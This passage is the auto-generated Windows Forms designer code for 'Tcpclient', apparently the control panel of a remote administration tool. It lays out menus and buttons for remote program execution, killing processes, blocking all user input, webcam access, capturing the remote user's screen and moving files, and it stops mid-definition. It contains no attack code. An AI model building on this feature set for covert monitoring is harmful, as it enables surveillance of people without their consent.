﻿namespace Tcpclient
{
    partial class Main
    {
        /// <summary>
        /// Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        /// Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            this.components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(Main));
            this.menuStrip1 = new System.Windows.Forms.MenuStrip();
            this.messagesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.runToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.rawMessageToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator1 = new System.Windows.Forms.ToolStripSeparator();
            this.messageBoxToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.trayTipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator2 = new System.Windows.Forms.ToolStripSeparator();
            this.chatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.saySomethingToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator3 = new System.Windows.Forms.ToolStripSeparator();
            this.blockemToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.softwareToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.blockProcessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.unblockProcessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.closeProcessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.killProcessToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.blockAllUserInputToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator12 = new System.Windows.Forms.ToolStripSeparator();
            this.webCamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.settingsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.receiveConfirmationMessagesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.clearTemporaryFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.forgetPasswordToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.helpToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.aboutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.statusStrip1 = new System.Windows.Forms.StatusStrip();
            this.toolStripStatusLabel1 = new System.Windows.Forms.ToolStripStatusLabel();
            this.button1 = new System.Windows.Forms.Button();
            this.groupBox1 = new System.Windows.Forms.GroupBox();
            this.label6 = new System.Windows.Forms.Label();
            this.linkLabel2 = new System.Windows.Forms.LinkLabel();
            this.button14 = new System.Windows.Forms.Button();
            this.linkLabel4 = new System.Windows.Forms.LinkLabel();
            this.numericUpDown1 = new System.Windows.Forms.NumericUpDown();
            this.label3 = new System.Windows.Forms.Label();
            this.comboBox2 = new System.Windows.Forms.ComboBox();
            this.label2 = new System.Windows.Forms.Label();
            this.comboBox1 = new System.Windows.Forms.ComboBox();
            this.label1 = new System.Windows.Forms.Label();
            this.timer1 = new System.Windows.Forms.Timer(this.components);
            this.listView1 = new System.Windows.Forms.ListView();
            this.columnHeader1 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader2 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader3 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.columnHeader4 = ((System.Windows.Forms.ColumnHeader)(new System.Windows.Forms.ColumnHeader()));
            this.imageList1 = new System.Windows.Forms.ImageList(this.components);
            this.label4 = new System.Windows.Forms.Label();
            this.button2 = new System.Windows.Forms.Button();
            this.button3 = new System.Windows.Forms.Button();
            this.button4 = new System.Windows.Forms.Button();
            this.backgroundWorker1 = new System.ComponentModel.BackgroundWorker();
            this.backgroundWorker2 = new System.ComponentModel.BackgroundWorker();
            this.addressBar = new System.Windows.Forms.TextBox();
            this.groupBox3 = new System.Windows.Forms.GroupBox();
            this.refreshButton = new System.Windows.Forms.Button();
            this.cutButton = new System.Windows.Forms.Button();
            this.recycleButton = new System.Windows.Forms.Button();
            this.pasteButton = new System.Windows.Forms.Button();
            this.copyButton = new System.Windows.Forms.Button();
            this.deleteButton = new System.Windows.Forms.Button();
            this.newFolderButton = new System.Windows.Forms.Button();
            this.renameButton = new System.Windows.Forms.Button();
            this.groupBox2 = new System.Windows.Forms.GroupBox();
            this.downloadButton = new System.Windows.Forms.Button();
            this.uploadButton = new System.Windows.Forms.Button();
            this.saveFileDialog1 = new System.Windows.Forms.SaveFileDialog();
            this.openFileDialog1 = new System.Windows.Forms.OpenFileDialog();
            this.fileManMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.newFolderToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator7 = new System.Windows.Forms.ToolStripSeparator();
            this.pasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator8 = new System.Windows.Forms.ToolStripSeparator();
            this.uploadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.label5 = new System.Windows.Forms.Label();
            this.openFileDialog2 = new System.Windows.Forms.OpenFileDialog();
            this.backgroundWorker3 = new System.ComponentModel.BackgroundWorker();
            this.textBox3 = new System.Windows.Forms.TextBox();
            this.timer2 = new System.Windows.Forms.Timer(this.components);
            this.fileMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.openToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.runWithArgumentsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.zipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.compressToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.extractToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator4 = new System.Windows.Forms.ToolStripSeparator();
            this.downloadMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator5 = new System.Windows.Forms.ToolStripSeparator();
            this.renameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.deleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.copyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.cutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator6 = new System.Windows.Forms.ToolStripSeparator();
            this.propertiesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.progressBar1 = new System.Windows.Forms.ProgressBar();
            this.label7 = new System.Windows.Forms.Label();
            this.toolTip1 = new System.Windows.Forms.ToolTip(this.components);
            this.windowMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
            this.viewDetailsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator10 = new System.Windows.Forms.ToolStripSeparator();
            this.activateToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toggleVisibilityToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator11 = new System.Windows.Forms.ToolStripSeparator();
            this.minimizeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.maximizeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.restoreToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.toolStripSeparator9 = new System.Windows.Forms.ToolStripSeparator();
            this.closeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
            this.goButton = new System.Windows.Forms.PictureBox();
            this.pictureBox1 = new System.Windows.Forms.PictureBox();
            this.menuStrip1.SuspendLayout();
            this.groupBox1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.numericUpDown1)).BeginInit();
            this.groupBox3.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.fileManMenu.SuspendLayout();
            this.fileMenu.SuspendLayout();
            this.windowMenu.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)(this.goButton)).BeginInit();
            ((System.ComponentModel.ISupportInitialize)(this.pictureBox1)).BeginInit();
            this.SuspendLayout();
            // 
            // menuStrip1
            // 
            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.messagesToolStripMenuItem,
            this.softwareToolStripMenuItem,
            this.settingsToolStripMenuItem,
            this.helpToolStripMenuItem});
            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Padding = new System.Windows.Forms.Padding(7, 2, 0, 2);
            this.menuStrip1.Size = new System.Drawing.Size(820, 24);
            this.menuStrip1.TabIndex = 0;
            this.menuStrip1.Text = "menuStrip1";
            // 
            // messagesToolStripMenuItem
            // 
            this.messagesToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.runToolStripMenuItem,
            this.rawMessageToolStripMenuItem,
            this.toolStripSeparator1,
            this.messageBoxToolStripMenuItem,
            this.trayTipToolStripMenuItem,
            this.toolStripSeparator2,
            this.chatToolStripMenuItem,
            this.saySomethingToolStripMenuItem,
            this.toolStripSeparator3,
            this.blockemToolStripMenuItem});
            this.messagesToolStripMenuItem.Name = "messagesToolStripMenuItem";
            this.messagesToolStripMenuItem.Size = new System.Drawing.Size(92, 20);
            this.messagesToolStripMenuItem.Text = "&New Message";
            // 
            // runToolStripMenuItem
            // 
            this.runToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.run_small;
            this.runToolStripMenuItem.Name = "runToolStripMenuItem";
            this.runToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
            this.runToolStripMenuItem.Text = "&Run";
            this.runToolStripMenuItem.Click += new System.EventHandler(this.runToolStripMenuItem_Click);
            // 
            // rawMessageToolStripMenuItem
            // 
            this.rawMessageToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.bat_small;
            this.rawMessageToolStripMenuItem.Name = "rawMessageToolStripMenuItem";
            this.rawMessageToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
            this.rawMessageToolStripMenuItem.Text = "R&aw Message";
            this.rawMessageToolStripMenuItem.Click += new System.EventHandler(this.rawMessageToolStripMenuItem_Click);
            // 
            // toolStripSeparator1
            // 
            this.toolStripSeparator1.Name = "toolStripSeparator1";
            this.toolStripSeparator1.Size = new System.Drawing.Size(150, 6);
            // 
            // messageBoxToolStripMenuItem
            // 
            this.messageBoxToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.envelope_small;
            this.messageBoxToolStripMenuItem.Name = "messageBoxToolStripMenuItem";
            this.messageBoxToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
            this.messageBoxToolStripMenuItem.Text = "&Message Box";
            this.messageBoxToolStripMenuItem.Click += new System.EventHandler(this.messageBoxToolStripMenuItem_Click);
            // 
            // trayTipToolStripMenuItem
            // 
            this.trayTipToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.info_small;
            this.trayTipToolStripMenuItem.Name = "trayTipToolStripMenuItem";
            this.trayTipToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
            this.trayTipToolStripMenuItem.Text = "&Tray Tip";
            this.trayTipToolStripMenuItem.Click += new System.EventHandler(this.trayTipToolStripMenuItem_Click);
            // 
            // toolStripSeparator2
            // 
            this.toolStripSeparator2.Name = "toolStripSeparator2";
            this.toolStripSeparator2.Size = new System.Drawing.Size(150, 6);
            // 
            // chatToolStripMenuItem
            // 
            this.chatToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.people_small;
            this.chatToolStripMenuItem.Name = "chatToolStripMenuItem";
            this.chatToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
            this.chatToolStripMenuItem.Text = "&Chat";
            this.chatToolStripMenuItem.Click += new System.EventHandler(this.chatToolStripMenuItem_Click);
            // 
            // saySomethingToolStripMenuItem
            // 
            this.saySomethingToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.say_small;
            this.saySomethingToolStripMenuItem.Name = "saySomethingToolStripMenuItem";
            this.saySomethingToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
            this.saySomethingToolStripMenuItem.Text = "&Say Something";
            this.saySomethingToolStripMenuItem.Click += new System.EventHandler(this.saySomethingToolStripMenuItem_Click);
            // 
            // toolStripSeparator3
            // 
            this.toolStripSeparator3.Name = "toolStripSeparator3";
            this.toolStripSeparator3.Size = new System.Drawing.Size(150, 6);
            // 
            // blockemToolStripMenuItem
            // 
            this.blockemToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.block_small;
            this.blockemToolStripMenuItem.Name = "blockemToolStripMenuItem";
            this.blockemToolStripMenuItem.Size = new System.Drawing.Size(153, 22);
            this.blockemToolStripMenuItem.Text = "&Block \'em!";
            this.blockemToolStripMenuItem.Click += new System.EventHandler(this.blockemToolStripMenuItem_Click);
            // 
            // softwareToolStripMenuItem
            // 
            this.softwareToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.blockProcessToolStripMenuItem,
            this.unblockProcessToolStripMenuItem,
            this.closeProcessToolStripMenuItem,
            this.killProcessToolStripMenuItem,
            this.blockAllUserInputToolStripMenuItem,
            this.toolStripSeparator12,
            this.webCamToolStripMenuItem});
            this.softwareToolStripMenuItem.Name = "softwareToolStripMenuItem";
            this.softwareToolStripMenuItem.Size = new System.Drawing.Size(109, 20);
            this.softwareToolStripMenuItem.Text = "&Remote Software";
            // 
            // blockProcessToolStripMenuItem
            // 
            this.blockProcessToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.block_small_2;
            this.blockProcessToolStripMenuItem.Name = "blockProcessToolStripMenuItem";
            this.blockProcessToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
            this.blockProcessToolStripMenuItem.Text = "&Block Process";
            this.blockProcessToolStripMenuItem.Click += new System.EventHandler(this.blockProcessToolStripMenuItem_Click);
            // 
            // unblockProcessToolStripMenuItem
            // 
            this.unblockProcessToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.ok_small;
            this.unblockProcessToolStripMenuItem.Name = "unblockProcessToolStripMenuItem";
            this.unblockProcessToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
            this.unblockProcessToolStripMenuItem.Text = "&Unblock Process";
            this.unblockProcessToolStripMenuItem.Click += new System.EventHandler(this.unblockProcessToolStripMenuItem_Click);
            // 
            // closeProcessToolStripMenuItem
            // 
            this.closeProcessToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.close_small;
            this.closeProcessToolStripMenuItem.Name = "closeProcessToolStripMenuItem";
            this.closeProcessToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
            this.closeProcessToolStripMenuItem.Text = "&Close Process";
            this.closeProcessToolStripMenuItem.Click += new System.EventHandler(this.closeProcessToolStripMenuItem_Click);
            // 
            // killProcessToolStripMenuItem
            // 
            this.killProcessToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.no_small;
            this.killProcessToolStripMenuItem.Name = "killProcessToolStripMenuItem";
            this.killProcessToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
            this.killProcessToolStripMenuItem.Text = "&Kill Process";
            this.killProcessToolStripMenuItem.Click += new System.EventHandler(this.killProcessToolStripMenuItem_Click);
            // 
            // blockAllUserInputToolStripMenuItem
            // 
            this.blockAllUserInputToolStripMenuItem.CheckOnClick = true;
            this.blockAllUserInputToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.block_small;
            this.blockAllUserInputToolStripMenuItem.Name = "blockAllUserInputToolStripMenuItem";
            this.blockAllUserInputToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
            this.blockAllUserInputToolStripMenuItem.Text = "Block &All User Input";
            this.blockAllUserInputToolStripMenuItem.Click += new System.EventHandler(this.blockAllUserInputToolStripMenuItem_Click);
            // 
            // toolStripSeparator12
            // 
            this.toolStripSeparator12.Name = "toolStripSeparator12";
            this.toolStripSeparator12.Size = new System.Drawing.Size(174, 6);
            // 
            // webCamToolStripMenuItem
            // 
            this.webCamToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.small_cam;
            this.webCamToolStripMenuItem.Name = "webCamToolStripMenuItem";
            this.webCamToolStripMenuItem.Size = new System.Drawing.Size(177, 22);
            this.webCamToolStripMenuItem.Text = "WebCam";
            this.webCamToolStripMenuItem.Click += new System.EventHandler(this.webCamToolStripMenuItem_Click);
            // 
            // settingsToolStripMenuItem
            // 
            this.settingsToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.receiveConfirmationMessagesToolStripMenuItem,
            this.clearTemporaryFolderToolStripMenuItem,
            this.forgetPasswordToolStripMenuItem});
            this.settingsToolStripMenuItem.Name = "settingsToolStripMenuItem";
            this.settingsToolStripMenuItem.Size = new System.Drawing.Size(61, 20);
            this.settingsToolStripMenuItem.Text = "&Options";
            // 
            // receiveConfirmationMessagesToolStripMenuItem
            // 
            this.receiveConfirmationMessagesToolStripMenuItem.Checked = true;
            this.receiveConfirmationMessagesToolStripMenuItem.CheckOnClick = true;
            this.receiveConfirmationMessagesToolStripMenuItem.CheckState = System.Windows.Forms.CheckState.Checked;
            this.receiveConfirmationMessagesToolStripMenuItem.Name = "receiveConfirmationMessagesToolStripMenuItem";
            this.receiveConfirmationMessagesToolStripMenuItem.Size = new System.Drawing.Size(242, 22);
            this.receiveConfirmationMessagesToolStripMenuItem.Text = "&Receive Confirmation Messages";
            // 
            // clearTemporaryFolderToolStripMenuItem
            // 
            this.clearTemporaryFolderToolStripMenuItem.Name = "clearTemporaryFolderToolStripMenuItem";
            this.clearTemporaryFolderToolStripMenuItem.Size = new System.Drawing.Size(242, 22);
            this.clearTemporaryFolderToolStripMenuItem.Text = "&Clear Temporary Folder";
            this.clearTemporaryFolderToolStripMenuItem.Click += new System.EventHandler(this.clearTemporaryFolderToolStripMenuItem_Click);
            // 
            // forgetPasswordToolStripMenuItem
            // 
            this.forgetPasswordToolStripMenuItem.Name = "forgetPasswordToolStripMenuItem";
            this.forgetPasswordToolStripMenuItem.Size = new System.Drawing.Size(242, 22);
            this.forgetPasswordToolStripMenuItem.Text = "&Forget Password";
            this.forgetPasswordToolStripMenuItem.Visible = false;
            this.forgetPasswordToolStripMenuItem.Click += new System.EventHandler(this.forgetPasswordToolStripMenuItem_Click);
            // 
            // helpToolStripMenuItem
            // 
            this.helpToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.aboutToolStripMenuItem});
            this.helpToolStripMenuItem.Name = "helpToolStripMenuItem";
            this.helpToolStripMenuItem.Size = new System.Drawing.Size(44, 20);
            this.helpToolStripMenuItem.Text = "&Help";
            // 
            // aboutToolStripMenuItem
            // 
            this.aboutToolStripMenuItem.Image = global::Tcpclient.Properties.Resources.help_small;
            this.aboutToolStripMenuItem.Name = "aboutToolStripMenuItem";
            this.aboutToolStripMenuItem.Size = new System.Drawing.Size(107, 22);
            this.aboutToolStripMenuItem.Text = "&About";
            this.aboutToolStripMenuItem.Click += new System.EventHandler(this.aboutToolStripMenuItem_Click);
            // 
            // statusStrip1
            // 
            this.statusStrip1.Location = new System.Drawing.Point(0, 734);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Padding = new System.Windows.Forms.Padding(2, 0, 16, 0);
            this.statusStrip1.Size = new System.Drawing.Size(820, 22);
            this.statusStrip1.TabIndex = 3;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(0, 17);
            // 
            // button1
            // 
            this.button1.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left)));
            this.button1.Enabled = false;
            this.button1.Location = new System.Drawing.Point(9, 480);
            this.button1.Name = "button1";
            this.button1.Size = new System.Drawing.Size(220, 39);
            this.button1.TabIndex = 4;
            this.button1.Text = "&Windows";
            this.toolTip1.SetToolTip(this.button1, "Window Manager");
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new System.EventHandler(this.button1_Click);
            // 
            // groupBox1
            // 
            this.groupBox1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left)));
            this.groupBox1.Controls.Add(this.label6);
            this.groupBox1.Controls.Add(this.linkLabel2);
            this.groupBox1.Controls.Add(this.button14);
            this.groupBox1.Controls.Add(this.linkLabel4);
            this.groupBox1.Controls.Add(this.numericUpDown1);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.comboBox2);
            this.groupBox1.Controls.Add(this.label2);
            this.groupBox1.Controls.Add(this.comboBox1);
            this.groupBox1.Controls.Add(this.label1);
            this.groupBox1.Location = new System.Drawing.Point(9, 196);
            this.groupBox1.Margin = new System.Windows.Forms.Padding(2);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Padding = new System.Windows.Forms.Padding(2);
            this.groupBox1.Size = new System.Drawing.Size(224, 279);
            this.groupBox1.TabIndex = 3;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Windows";
            // 
            // label6
            // 
            this.label6.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.label6.AutoSize = true;
            this.label6.Location = new System.Drawing.Point(26, 91);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(143, 60);
            this.label6.TabIndex = 24;
            this.label6.Text = "File Manager 2.0\r\nby Timothy Baxendale\r\n\r\nIcons used with gratitude:";
            this.label6.Visible = false;
            // 
            // linkLabel2
            // 
            this.linkLabel2.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.linkLabel2.AutoSize = true;
            this.linkLabel2.Location = new System.Drawing.Point(26, 148);
            this.linkLabel2.Name = "linkLabel2";
            this.linkLabel2.Size = new System.Drawing.Size(99, 15);
            this.linkLabel2.TabIndex = 25;
            this.linkLabel2.TabStop = true;
            this.linkLabel2.Text = "visualpharm.com";
            this.linkLabel2.Visible = false;
            // 
            // button14
            // 
            this.button14.Location = new System.Drawing.Point(38, 179);
            this.button14.Name = "button14";
            this.button14.Size = new System.Drawing.Size(148, 43);
            this.button14.TabIndex = 23;
            this.button14.Text = "Screen &Capture";
            this.toolTip1.SetToolTip(this.button14, "Retrieve screen shots of the remote user");
            this.button14.UseVisualStyleBackColor = true;
            this.button14.Click += new System.EventHandler(this.button14_Click);
            // 
            // linkLabel4
            // 
            this.linkLabel4.Anchor = System.Windows.Forms.AnchorStyles.Left;
            this.linkLabel4.AutoSize = true;
            this.linkLabel4.Location = new System.Drawing.Point(26, 163);
            this.linkLabel4.Name = "linkLabel4";
            this.linkLabel4.Size = new System.Drawing.Size(119, 15);
            this.linkLabel4.TabIndex = 24;
            this.linkLabel4.TabStop = true;
            this.linkLabel4.Text = "tatice.deviantart.com";
            this.linkLabel4.Visible = false;
            // 
            // numericUpDown1
            // 
            this.numericUpDown1.Location = new System.Drawing.Point(111, 145);
            this.numericUpDown1.Margin = new System.Windows.Forms.Padding(2);
            this.numericUpDown1.Name = "numericUpDown1";
            this.numericUpDown1.Size = new System.Drawing.Size(61, 23);
            this.numericUpDown1.TabIndex = 5;
            this.toolTip1.SetToolTip(this.numericUpDown1, "Higher quality may take longer to download");
            this.numericUpDown1.Value = new decimal(new int[] {
            50,
            0,
            0,
            0});
            this.numericUpDown1.ValueChanged += new System.EventHandler(this.numericUpDown1_ValueChanged);
            // 
            // label3
            // 
            this.label3.AutoSize = true;
            this.label3.Location = new System.Drawing.Point(15, 148);
            this.label3.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label3.Name = "label3";
            this.label3.Size = new System.Drawing.Size(88, 15);
            this.label3.TabIndex = 4;
            this.label3.Text = "Picture Quality:";
            // 
            // comboBox2
            // 
            this.comboBox2.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBox2.FormattingEnabled = true;
            this.comboBox2.Items.AddRange(new object[] {
            "All Windows",
            "Visible Windows",
            "Minimized Windows",
            "Maximized Windows"});
            this.comboBox2.Location = new System.Drawing.Point(57, 108);
            this.comboBox2.Margin = new System.Windows.Forms.Padding(2);
            this.comboBox2.Name = "comboBox2";
            this.comboBox2.Size = new System.Drawing.Size(154, 23);
            this.comboBox2.TabIndex = 3;
            // 
            // label2
            // 
            this.label2.AutoSize = true;
            this.label2.Location = new System.Drawing.Point(15, 112);
            this.label2.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label2.Name = "label2";
            this.label2.Size = new System.Drawing.Size(35, 15);
            this.label2.TabIndex = 2;
            this.label2.Text = "View:";
            // 
            // comboBox1
            // 
            this.comboBox1.DropDownStyle = System.Windows.Forms.ComboBoxStyle.DropDownList;
            this.comboBox1.FormattingEnabled = true;
            this.comboBox1.Items.AddRange(new object[] {
            "5 Seconds",
            "3 Seconds",
            "1 Second",
            "Freeze"});
            this.comboBox1.Location = new System.Drawing.Point(105, 69);
            this.comboBox1.Margin = new System.Windows.Forms.Padding(2);
            this.comboBox1.Name = "comboBox1";
            this.comboBox1.Size = new System.Drawing.Size(107, 23);
            this.comboBox1.TabIndex = 1;
            this.comboBox1.SelectedIndexChanged += new System.EventHandler(this.comboBox1_SelectedIndexChanged);
            // 
            // label1
            // 
            this.label1.AutoSize = true;
            this.label1.Location = new System.Drawing.Point(15, 73);
            this.label1.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(75, 15);
            this.label1.TabIndex = 0;
            this.label1.Text = "Refresh Rate:";
            // 
            // timer1
            // 
            this.timer1.Interval = 3000;
            this.timer1.Tick += new System.EventHandler(this.timer1_Tick);
            // 
            // listView1
            // 
            this.listView1.Anchor = ((System.Windows.Forms.AnchorStyles)((((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.listView1.BackColor = System.Drawing.Color.White;
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2,
            this.columnHeader3,
            this.columnHeader4});
            this.listView1.Font = new System.Drawing.Font("Segoe UI", 9.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.LargeImageList = this.imageList1;
            this.listView1.Location = new System.Drawing.Point(240, 67);
            this.listView1.Margin = new System.Windows.Forms.Padding(2);
            this.listView1.Name = "listView1";
            this.listView1.Size = new System.Drawing.Size(569, 667);
            this.listView1.TabIndex = 12;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            this.listView1.MouseDoubleClick += new System.Windows.Forms.MouseEventHandler(this.listView1_MouseDoubleClickWM);
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Window Name";
            this.columnHeader1.Width = 266;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "State";
            this.columnHeader2.Width = 82;
            // 
            // columnHeader3
            // 
            this.columnHeader3.Text = "Position";
            this.columnHeader3.Width = 120;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Size";
            this.columnHeader4.Width = 65;
            // 
            // imageList1
            // 
            this.imageList1.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList1.ImageStream")));
            this.imageList1.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList1.Images.SetKeyName(0, "avi");
            this.imageList1.Images.SetKeyName(1, "bat");
            this.imageList1.Images.SetKeyName(2, "dll");
            this.imageList1.Images.SetKeyName(3, "doc");
            this.imageList1.Images.SetKeyName(4, "exe");
            this.imageList1.Images.SetKeyName(5, "ini");
            this.imageList1.Images.SetKeyName(6, "m4a");
            this.imageList1.Images.SetKeyName(7, "m4v");
            this.imageList1.Images.SetKeyName(8, "mp3");
            this.imageList1.Images.SetKeyName(9, "mp4v");
            this.imageList1.Images.SetKeyName(10, "xls");
            this.imageList1.Images.SetKeyName(11, "wmv");
            this.imageList1.Images.SetKeyName(12, "wma");
            this.imageList1.Images.SetKeyName(13, "wav");
            this.imageList1.Images.SetKeyName(14, "txt");
            this.imageList1.Images.SetKeyName(15, "ppt");
            this.imageList1.Images.SetKeyName(16, "mpeg");
            this.imageList1.Images.SetKeyName(17, "bmp");
            this.imageList1.Images.SetKeyName(18, "java");
            this.imageList1.Images.SetKeyName(19, "script");
            this.imageList1.Images.SetKeyName(20, "blank");
            this.imageList1.Images.SetKeyName(21, "folder");
            this.imageList1.Images.SetKeyName(22, "zip");
            // 
            // label4
            // 
            this.label4.AutoSize = true;
            this.label4.Font = new System.Drawing.Font("Segoe UI Semibold", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label4.Location = new System.Drawing.Point(236, 38);
            this.label4.Margin = new System.Windows.Forms.Padding(2, 0, 2, 0);
            this.label4.Name = "label4";
            this.label4.Size = new System.Drawing.Size(139, 21);
            this.label4.TabIndex = 10;
